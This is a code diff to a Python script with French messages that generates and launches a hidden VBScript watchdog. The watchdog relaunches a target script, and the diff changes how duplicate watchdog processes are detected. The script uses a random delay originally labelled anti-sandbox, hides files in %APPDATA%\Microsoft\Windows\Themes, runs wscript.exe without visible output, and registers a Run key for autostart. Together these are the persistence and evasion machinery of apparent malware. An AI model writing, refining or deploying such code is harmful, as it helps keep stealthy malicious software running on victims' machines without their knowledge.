@@ -18,12 +18,12 @@ vbs_template = r'''On Error Resume Next
 Set WshShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 target = "{script_path}"
+watchdogName = "watchdog.vbs"
 
-' Éviter exécution multiple de ce même watchdog
 Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
 count = 0
 For Each proc In colMe
-    If InStr(LCase(proc.CommandLine), LCase(WScript.ScriptName)) > 0 Then
+    If InStr(LCase(proc.CommandLine), LCase(watchdogName)) > 0 Then
         count = count + 1
     End If
 Next
@@ -31,7 +31,6 @@ If count > 1 Then
     WScript.Quit
 End If
 
-' Sleep aléatoire initial (anti-sandbox)
 Randomize
 WScript.Sleep (Int((80 * Rnd) + 10) * 1000)
 
@@ -96,15 +95,6 @@ def deleteVbsFileAfterFinish():
         except Exception as e:
             print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
 
-def is_process_running(script_path):
-    for proc in psutil.process_iter(['name', 'cmdline']):
-        try:
-            if 'wscript.exe' in proc.info['name'].lower():
-                if script_path.lower() in ' '.join(proc.info['cmdline']).lower():
-                    return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied):
-            continue
-    return False
 
 def create_watchdog_vbs():
     script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
@@ -120,14 +110,15 @@ def create_watchdog_vbs():
             
             existing_vbs = [
                 f for f in os.listdir(folder)
-                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog_')
+                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog')
             ]
-
+            
             if existing_vbs:
                 print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
                 vbs_exist_path = os.path.join(folder, existing_vbs[0])
-                if is_process_running(vbs_exist_path):
+                if is_watchdog_running(vbs_exist_path):
                     print(f"[!] Watchdog déjà actif : {vbs_exist_path}")
+                    return
                 else:
                     subprocess.Popen(
                         ["wscript.exe", vbs_exist_path],
@@ -135,9 +126,9 @@ def create_watchdog_vbs():
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL)
+                    return
 
-            random_name = f"watchdog_{secrets.token_hex(4)}.vbs"
-            vbs_path = os.path.join(folder, random_name)
+            vbs_path = os.path.join(folder, "watchdog.vbs")
             vbsFile.append(vbs_path)
 
             escaped_vbs_path = vbs_path.replace("\\", "\\\\")
@@ -164,6 +155,18 @@ def create_watchdog_vbs():
         except Exception as e:  
             print(f"Erreur création watchdog dans {folder}: {e}")
 
+def is_watchdog_running(watchdog_vbs_path):
+    watchdog_vbs_path = watchdog_vbs_path.lower()
+    for proc in psutil.process_iter(['name', 'cmdline']):
+        try:
+            name = proc.info['name']
+            cmdline = proc.info['cmdline']
+            if name and 'wscript.exe' in name.lower():
+                if cmdline and any(watchdog_vbs_path in arg.lower() for arg in cmdline):
+                    return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return False
 
 def ajouter_run_key_vbs_relatif():
     hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
